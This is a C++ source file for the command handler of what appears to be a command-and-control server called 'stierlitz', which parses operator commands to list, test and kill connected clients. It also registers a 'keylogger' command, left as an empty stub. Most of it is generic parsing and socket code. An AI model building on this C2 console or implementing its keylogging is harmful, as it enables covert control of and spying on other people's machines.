#include "command_handler.hpp"

C2FIFO::C2FIFO() {
    fd_in = -1;
    fd_out = -1;
}

C2FIFO::~C2FIFO() {
    if (fd_in >= 0) {
        close(fd_in);
    }
    if (fd_out >= 0) {
        close(fd_out);
    }
}

int C2FIFO::init() {
    fd_in = open(C2_IN_FIFO_PATH, O_RDONLY | O_NONBLOCK);
    if (fd_in < 0) {
        close(fd_out);
        fd_out = -1;
        return -1;
    }

    int tries = 0;
    while ((fd_out = open(C2_OUT_FIFO_PATH, O_WRONLY | O_NONBLOCK)) < 0 && tries++ < 20) {
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }
    if (fd_out < 0) {
        return -1;
    }

    return 0;
}

Argument::Argument(int __arg_num, int __arg_value_type, const std::string& __arg_abbr, const std::string& __arg_full) {
    arg_num_ = __arg_num;
    arg_value_type_ = __arg_value_type;
    arg_abbr_ = __arg_abbr;
    arg_full_ = __arg_full;
}

Command::Command(
    const std::string& __description,
    void (CommandHandler::*__p_command_func)(), // Correct type for member function pointer
    CommandHandler* __p_command_handler,
    std::initializer_list<int> __optional,
    std::initializer_list<int> __required
) {
    description_ = __description;
    p_command_func_ = __p_command_func;
    p_command_handler_ = __p_command_handler;

    if (__optional.size() > 0) {
        for (const int& i : __optional) {
            optional_.push_back(i);
        }
    }

    for (const int& i : __required) {
        required_.push_back(i);
    }
}

CommandHandler::CommandHandler(
    std::vector<ClientHandler*>* __p_clients,
    EventLog* __p_event_log,
    std::atomic<bool>* __p_shutdown_flag,
    std::string* __p_ip,
    uint* __p_port,
    int* __p_user_verbosity,
    int __shutdown_event_fd): p_ip_(__p_ip),p_port_(__p_port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity), shutdown_event_fd_(__shutdown_event_fd) {
    

    argument_list_.push_back(Argument(INDEX_ARG, ARG_TYPE_INT, "-i", "--index"));
    argument_list_.push_back(Argument(ALL_ARG, ARG_TYPE_SET, "-a", "--all"));
    argument_list_.push_back(Argument(HELP_ARG, ARG_TYPE_SET, "-h", "--help"));
    argument_list_.push_back(Argument(KILL_ARG, ARG_TYPE_SET, "-k", "--kill"));
    argument_list_.push_back(Argument(VERBOSITY_ARG, ARG_TYPE_INT, "-v", "--verbosity"));

    command_map_.emplace("help", Command(
        "Show this help message. For specific command help <command> or <command> -h/--help", 
        &CommandHandler::help,
        this,
        {HELP_ARG}
    ));
    command_map_.emplace("test", Command(
        "Test command. For specific command help <command> or <command> -h/--help",
        &CommandHandler::test,
        this,
        {HELP_ARG},
        {INDEX_ARG, ALL_ARG}
    ));
    command_map_.emplace("list", Command(
        "List all clients",
        &CommandHandler::list,
        this,
        {HELP_ARG}
    ));
    command_map_.emplace("set-verb", Command(
        "Set verbosity level",
        &CommandHandler::set_verbosity,
        this,
        {HELP_ARG},
        {VERBOSITY_ARG}
    ));
    command_map_.emplace("show-verb", Command(
        "Show current verbosity level and list of available verbosity levels",
        &CommandHandler::show_verbosity,
        this,
        {HELP_ARG}
    ));
    command_map_.emplace("keylogger", Command(
        "Start listening the key logs of the selected client. Usage: keylogger -i <client_index>",
        &CommandHandler::keylogger,
        this,
        {HELP_ARG},
        {INDEX_ARG}
    ));
    command_map_.emplace("kill", Command(
        "Kill the selected client. Usage: kill -i <client_index> / kill -a to kill all clients",
        &CommandHandler::kill,
        this,
        {HELP_ARG},
        {INDEX_ARG, ALL_ARG}
    ));
}

CommandHandler::~CommandHandler() {
}

bool CommandHandler::command_exists(const std::string& __root_cmd) {
    return command_map_.find(__root_cmd) != command_map_.end();
}

int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::string& __args_str) {
    // Break the input into individual arguments
    std::istringstream iss(__args_str);
    std::vector<std::string> args((std::istream_iterator<std::string>(iss)), std::istream_iterator<std::string>());

    std::unordered_map<int, std::any> temp_arg_map;
    std::vector<int> found_required_args;

    Command& command = command_map_.at(__root_cmd);

    for (size_t i = 0; i < args.size(); i++) {
        const std::string& arg = args[i];

        auto it = std::find_if(argument_list_.begin(), argument_list_.end(), [&arg](const Argument& a) {
            return arg == a.arg_abbr_ || arg == a.arg_full_;
        });

        if (it == argument_list_.end()) {
            *p_event_log_ << LOG_MUST << RED << "Unknown argument: " << arg << RESET_C2_FIFO;
            return -1;
        }

        int arg_num = it->arg_num_;
        int arg_type = it->arg_value_type_;

        // Track whether required arguments are found
        if (std::find(command.required_.begin(), command.required_.end(), it->arg_num_) != command.required_.end()) {
            found_required_args.push_back(it->arg_num_);
        }

        if (arg_type != ARG_TYPE_SET) {
            if (i + 1 >= args.size()) {
                *p_event_log_ << LOG_MUST << RED << "Missing value for argument: " << arg << RESET_C2_FIFO;
                return -1;
            }

            const std::string& value = args[i+1];

            bool is_next_arg_flag = std::any_of(argument_list_.begin(), argument_list_.end(), [&value](const Argument& a) {
                return value == a.arg_abbr_ || value == a.arg_full_;
            });
        
            if (is_next_arg_flag) {
                *p_event_log_ << LOG_MUST << RED << "Expected value after argument: " << arg << ", but got another argument: " << value << RESET_C2_FIFO;
                return -1;
            }

            try {
                if (arg_type == ARG_TYPE_INT) {
                    temp_arg_map[arg_num] = std::stoi(value);
                } else if (arg_type == ARG_TYPE_STRING) {
                    temp_arg_map[arg_num] = value;
                } else {
                    *p_event_log_ << LOG_MUST << RED << "Unknown argument type for argument: " << arg << RESET_C2_FIFO;
                    return -1;
                }

                i++; // Skip the value since it's already processed
            } catch (const std::exception& e) {
                *p_event_log_ << LOG_MUST << RED << "Invalid value for argument " << arg << ": " << e.what() << RESET_C2_FIFO;
                return -1;
            }
        } else {
            temp_arg_map[it->arg_num_] = true;
        }    
    }

    if (temp_arg_map.find(HELP_ARG) != temp_arg_map.end()) {
        *p_event_log_ << LOG_MUST << CYAN << __root_cmd << " " << command.description_ << RESET;
        return HELP_ARG;
    }

    if (std::find(command.required_.begin(), command.required_.end(), INDEX_ARG) != command.required_.end() &&
    std::find(command.required_.begin(), command.required_.end(), ALL_ARG) != command.required_.end()) {
        bool index_found = temp_arg_map.find(INDEX_ARG) != temp_arg_map.end();
        bool all_found = temp_arg_map.find(ALL_ARG) != temp_arg_map.end();

        if (index_found && all_found) {
            *p_event_log_ << LOG_MUST << RED << "Cannot use both -i and -a arguments at the same time" << RESET_C2_FIFO;
            return -1;
        } 
        if (!index_found && !all_found) {
            *p_event_log_ << LOG_MUST << RED << "Either -i or -a argument is required" << RESET_C2_FIFO;
            return -1;
        }
    }

    for (int required_arg : command.required_) {
        if (required_arg == INDEX_ARG || required_arg == ALL_ARG) {
            continue; // Skip INDEX_ARG and ALL_ARG
        }
        if (std::find(found_required_args.begin(), found_required_args.end(), required_arg) == found_required_args.end()) {
            return -1;
        }
    }

    arg_map_ = std::move(temp_arg_map);
    return 0;
}

int CommandHandler::parse_command(const std::string& __root_cmd) {
    

    if (!command_exists(__root_cmd)) {
        *p_event_log_ << LOG_MUST << RED << "Command not found: " << __root_cmd << ". Type help to see all the available commands" << RESET_C2_FIFO;
        return -1;
    }

    std::string args_str = "";
    size_t space_pos = cmd_.find(' ');
    if (space_pos != std::string::npos) {
        args_str = cmd_.substr(space_pos + 1); // Extract everything after the first space
    }
    int rc = parse_arguments(__root_cmd, args_str);
    if (rc < 0) {
        *p_event_log_ << LOG_MUST << RED << "Invalid command usage! Type " << __root_cmd << " -h to see the usage" << RESET_C2_FIFO;
        return -1;
    } else if (rc == HELP_ARG) {
        return -1;
    }

    return 0;
}

void CommandHandler::send_packet(uint16_t __packet, int __client_index) {
    int rc = send(p_clients_->at(__client_index)->socket(), &__packet, sizeof(__packet),0);
    if (rc < 0) {
        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Error sending command to client " << __client_index << ": " << rc << RESET;
    } else if (rc == PEER_DISCONNECTED_ERROR) {
        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Client " << __client_index << " disconnected" << RESET;
    } else {
        *p_event_log_ << LOG_DEBUG << GREEN << "[CommandHandler::send_client] Command sent to client " << __client_index << RESET;
    }
}

void CommandHandler::send_client(CommandCode __command, uint8_t __port, int __client_index) {
    if (__client_index < 0 || __client_index >= p_clients_->size()) {
        *p_event_log_ << LOG_DEBUG << RED << "[CommandHandler::send_client] Invalid client index: " << __client_index << RESET;
        return;
    }

    if (p_clients_->at(__client_index) != nullptr && ClientHandler::is_client_up(p_clients_->at(__client_index)->socket()) == 0) {
        uint16_t packet = (__command << 8) | __port;
        send_packet(packet, __client_index);
    } else {
        *p_event_log_ << LOG_DEBUG << YELLOW << "[CommandHandler::send_client] Client " << __client_index << " is not available" << RESET;
    }
}

void CommandHandler::send_client(CommandCode __command) {
    uint16_t packet = __command << 8;
    for (int i=0; i<p_clients_->size(); i++) {
        if (p_clients_->at(i) != nullptr && ClientHandler::is_client_up(p_clients_->at(i)->socket()) == 0) {
            send_packet(packet, i);
        }
    }
}

void CommandHandler::help() {
    *p_event_log_ << LOG_MUST << CYAN << "\nstierlitz Available commands\n";
    for (const auto& [cmd, command] : command_map_) {
        *p_event_log_ << LOG_MUST << CYAN << cmd << "   " << command.description_ << "\n";
    }
    *p_event_log_ << RESET_C2_FIFO;
}

void CommandHandler::test() {
    if(arg_map_.find(INDEX_ARG) != arg_map_.end()) {
        send_client(TEST, 0, std::any_cast<int>(arg_map_[INDEX_ARG]));
    }
    if(arg_map_.find(ALL_ARG) != arg_map_.end()) {
        send_client(TEST);
    }
}

void CommandHandler::list() {
    *p_event_log_ << LOG_MUST << CYAN << "[Available Clients]";
    for (int i=0; i<p_clients_->size(); i++) {
        if (p_clients_->at(i) != nullptr) {
            *p_event_log_ << "\n==Client " << i << "==    " << p_clients_->at(i)->ip();
        }
    }
    *p_event_log_ << RESET_C2_FIFO;
}

void CommandHandler::show_verbosity() {
    *p_event_log_ << LOG_MUST << CYAN << "Current verbosity level: " << *p_user_verbosity_ <<
    "\n\nAvailable verbosity levels:\n" <<
    "0 - No output\n" <<
    "1 - Critical errors only\n" <<
    "2 - Critical errors and crashes\n" <<
    "3 - Critical errors, crashes and minor events\n" <<
    "4 - (Debug Mode) Critical errors, crashes, minor events and debug information\n" << 
    "set-verb to change the verbosity" << RESET_C2_FIFO; 
}

void CommandHandler::set_verbosity() {
    int new_verbosity = std::any_cast<int>(arg_map_[VERBOSITY_ARG]);
    if (new_verbosity < 0 || new_verbosity > 4) {
        *p_event_log_ << LOG_MUST << RED << "Invalid verbosity level: " << new_verbosity << RESET_C2_FIFO;
        return;
    }
    *p_user_verbosity_ = new_verbosity;
}

void CommandHandler::kill() {
    if (arg_map_.find(INDEX_ARG) != arg_map_.end()) {
        send_client(KILL, 0, std::any_cast<int>(arg_map_[INDEX_ARG]));
    }
    if (arg_map_.find(ALL_ARG) != arg_map_.end()) {
        send_client(KILL);
    }
}

void CommandHandler::keylogger() {
    
}

void CommandHandler::execute_command(char* __cmd, int __len) {
    int rc = 0;

    cmd_ = std::string(__cmd, __len);
    std::string root_cmd = cmd_.substr(0, cmd_.find(' '));

    rc = parse_command(root_cmd);
    if (rc < 0) {
        cleanup();
        return;
    }

    // Execute the command
    Command& command = command_map_.at(root_cmd);
    (command.p_command_handler_->*command.p_command_func_)();

    cleanup();
}

void CommandHandler::cleanup() {
    cmd_.clear();
    arg_map_.clear();
}